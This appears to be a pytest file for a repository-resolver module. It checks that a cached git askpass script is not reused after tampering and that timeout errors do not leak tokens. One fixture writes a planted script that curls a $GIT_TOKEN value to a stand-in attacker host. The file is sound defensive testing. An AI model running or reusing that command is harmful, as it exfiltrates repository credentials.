"""repo_resolver credential hygiene (packs c1b00f1251, e010191677)."""
from __future__ import annotations

import os
import subprocess
import traceback
from pathlib import Path

import pytest

from auditor import repo_resolver as rr


@pytest.fixture(autouse=True)
def fresh_askpass(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(rr, "_ASKPASS_PATH", None)


# --- c1b00f1251: the cached askpass path is reused only while it is still ours -------------------

def test_askpass_lives_in_a_private_dir() -> None:
    script = Path(rr._askpass_script())
    assert (os.lstat(script.parent).st_mode & 0o077) == 0
    assert (os.lstat(script).st_mode & 0o022) == 0
    assert rr._askpass_script() == str(script)


def test_a_replaced_askpass_file_is_not_reused() -> None:
    first = Path(rr._askpass_script())
    # A temp cleaner removed it, and someone put their own script at the known path.
    first.unlink()
    first.write_text("#!/bin/sh\ncurl -d \"$GIT_TOKEN\" https://attacker.example\n")
    first.chmod(0o755)
    second = Path(rr._askpass_script())
    assert second != first
    assert "attacker" not in second.read_text()
    assert "$GIT_TOKEN" in second.read_text()


def test_a_world_writable_or_linked_askpass_is_not_reused(tmp_path: Path) -> None:
    first = Path(rr._askpass_script())
    first.chmod(0o777)
    second = Path(rr._askpass_script())
    assert second != first
    target = tmp_path / "evil.sh"
    target.write_text(rr._ASKPASS_BODY)
    second.unlink()
    second.symlink_to(target)
    assert Path(rr._askpass_script()) != second


# --- e010191677: a timeout never chains the unredacted TimeoutExpired ----------------------------

def test_timeout_error_carries_no_command_or_output(monkeypatch: pytest.MonkeyPatch) -> None:
    secret = "ghs_TOPSECRET"

    def hang(args, **k):
        raise subprocess.TimeoutExpired(cmd=args, timeout=1, output=f"partial {secret}",
                                        stderr=f"stderr {secret}")

    monkeypatch.setattr(rr.subprocess, "run", hang)
    with pytest.raises(RuntimeError, match="timed out") as ei:
        rr._run_git(["git", "fetch", f"https://x:{secret}@example.invalid/r.git"], {}, "r", secret)
    assert ei.value.__cause__ is None
    printed = "".join(traceback.format_exception(ei.value))
    assert secret not in printed
    assert "TimeoutExpired" not in printed
